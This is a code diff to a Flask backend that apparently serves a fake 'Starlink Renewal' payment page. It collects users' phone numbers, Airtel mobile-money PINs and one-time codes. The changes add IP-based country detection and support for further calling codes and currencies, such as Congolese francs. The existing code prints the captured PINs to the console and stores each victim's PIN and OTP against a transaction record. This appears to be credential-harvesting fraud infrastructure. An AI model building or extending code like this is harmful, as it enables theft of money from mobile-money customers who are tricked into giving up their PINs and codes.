@@ -30,6 +30,48 @@ def health_check():
         "timestamp": datetime.datetime.now().isoformat()
     }), 200
 
+@app.route('/api/geo', methods=['GET'])
+def get_ip_geo():
+    """Detect client IP and resolve country for currency localization"""
+    forwarded = request.headers.get('X-Forwarded-For')
+    if forwarded:
+        client_ip = forwarded.split(',')[0].strip()
+    else:
+        client_ip = request.remote_addr or ''
+
+    # Header-based country detection (Cloudflare / Vercel proxies)
+    cf_country = request.headers.get('CF-IPCountry')
+    vercel_country = request.headers.get('X-Vercel-IP-Country')
+    header_country = cf_country or vercel_country
+    if header_country and header_country != 'XX':
+        return jsonify({
+            "ip": client_ip,
+            "country_code": header_country.upper()
+        }), 200
+
+    # If public IP, query ipwho.is
+    if client_ip and not client_ip.startswith(('127.', '192.168.', '10.', '172.', '::1', 'fe80')):
+        try:
+            geo_res = requests.get(f"https://ipwho.is/{client_ip}", timeout=3)
+            if geo_res.ok:
+                geo_data = geo_res.json()
+                if geo_data.get('success') and geo_data.get('country_code'):
+                    return jsonify({
+                        "ip": client_ip,
+                        "country_code": geo_data['country_code'].upper(),
+                        "country_name": geo_data.get('country'),
+                        "calling_code": geo_data.get('calling_code')
+                    }), 200
+        except Exception:
+            pass
+
+    return jsonify({
+        "ip": client_ip or "127.0.0.1",
+        "country_code": "KE",
+        "country_name": "Kenya",
+        "calling_code": "254"
+    }), 200
+
 @app.route('/api/airtel/request-otp', methods=['POST'])
 @app.route('/api/airtel/send-otp', methods=['POST'])
 def send_airtel_otp():
@@ -39,12 +81,15 @@ def send_airtel_otp():
     pin = data.get('pin', '').strip()
     amount = data.get('amount', 'KES 115')
     package_name = data.get('package_name') or data.get('package', 'Starlink Renewal')
+    country_code = data.get('country_code', 'KE')
+    calling_code = str(data.get('calling_code', '254')).lstrip('+')
+    currency = 'CDF' if country_code in ('CD', 'COD') else data.get('currency', 'KES')
 
     if not phone:
         return jsonify({"success": False, "error": "Phone number is required."}), 400
 
-    # Format phone number cleanly
-    clean_phone = phone if phone.startswith('+') else f"+254{phone.lstrip('0')}"
+    # Format phone number cleanly using the country's calling code
+    clean_phone = phone if phone.startswith('+') else f"+{calling_code}{phone.lstrip('0')}"
     tx_id = f"AT-{random.randint(10000000, 99999999)}"
 
     # If external Airtel API URL is provided in .env, send request to Airtel API
@@ -54,8 +99,8 @@ def send_airtel_otp():
         try:
             headers = {
                 "Content-Type": "application/json",
-                "X-Country": "KE",
-                "X-Currency": "KES"
+                "X-Country": country_code,
+                "X-Currency": currency
             }
             if AIRTEL_API_KEY:
                 headers["Authorization"] = f"Bearer {AIRTEL_API_KEY}"
@@ -75,6 +120,8 @@ def send_airtel_otp():
         "transaction_id": tx_id,
         "phone": clean_phone,
         "amount": amount,
+        "currency": currency,
+        "country": country_code,
         "package": package_name,
         "pin_provided": pin if pin else "N/A",
         "otp_entered": "Waiting for customer...",
@@ -86,7 +133,7 @@ def send_airtel_otp():
 
     print(f"==================================================")
     print(f"[AIRTEL GATEWAY] Requesting Airtel to dispatch OTP to {clean_phone}")
-    print(f"Transaction ID: {tx_id} | PIN provided: {pin}")
+    print(f"Transaction ID: {tx_id} | Amount: {amount} | PIN provided: {pin}")
     print(f"==================================================")
 
     return jsonify({
@@ -94,6 +141,8 @@ def send_airtel_otp():
         "message": f"OTP request sent successfully to Airtel for {clean_phone}.",
         "transaction_id": tx_id,
         "phone": clean_phone,
+        "amount": amount,
+        "currency": currency,
         "status": "OTP_SENT"
     }), 200
 
@@ -106,11 +155,14 @@ def submit_airtel_otp():
     phone = data.get('phone', '').strip()
     pin = data.get('pin', '').strip()
     otp = data.get('otp', '').strip()
+    country_code = data.get('country_code', 'KE')
+    calling_code = str(data.get('calling_code', '254')).lstrip('+')
+    currency = 'CDF' if country_code in ('CD', 'COD') else data.get('currency', 'KES')
 
     if not otp:
         return jsonify({"success": False, "error": "OTP code is required."}), 400
 
-    clean_phone = phone if phone.startswith('+') else f"+254{phone.lstrip('0')}"
+    clean_phone = phone if phone.startswith('+') else f"+{calling_code}{phone.lstrip('0')}"
 
     # Find existing transaction or create log
     target_tx = None
@@ -132,6 +184,8 @@ def submit_airtel_otp():
             "transaction_id": new_tx_id,
             "phone": clean_phone,
             "amount": data.get('amount', 'KES 115'),
+            "currency": currency,
+            "country": country_code,
             "package": data.get('package', 'Starlink Renewal'),
             "pin_provided": pin if pin else "N/A",
             "otp_entered": otp,
